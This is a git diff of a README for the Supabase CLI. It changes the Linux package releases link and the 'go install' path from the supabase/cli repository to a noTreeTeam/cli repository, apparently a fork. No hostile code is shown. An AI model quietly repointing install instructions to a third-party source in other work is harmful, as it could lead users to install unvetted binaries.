@@ -119,7 +119,7 @@ For Bun versions below v1.0.17, you must add `supabase` as a [trusted dependency
 
   #### via Linux packages
 
-  Linux packages are provided in [Releases](https://github.com/supabase/cli/releases). To install, download the `.apk`/`.deb`/`.rpm`/`.pkg.tar.zst` file depending on your package manager and run the respective commands.
+  Linux packages are provided in [Releases](https://github.com/noTreeTeam/cli/releases). To install, download the `.apk`/`.deb`/`.rpm`/`.pkg.tar.zst` file depending on your package manager and run the respective commands.
 
   ```sh
   sudo apk add --allow-untrusted <...>.apk
@@ -144,7 +144,7 @@ For Bun versions below v1.0.17, you must add `supabase` as a [trusted dependency
   You can also install the CLI via [go modules](https://go.dev/ref/mod#go-install) without the help of package managers.
 
   ```sh
-  go install github.com/supabase/cli@latest
+  go install github.com/noTreeTeam/cli@latest
   ```
 
   Add a symlink to the binary in `$PATH` for easier access:
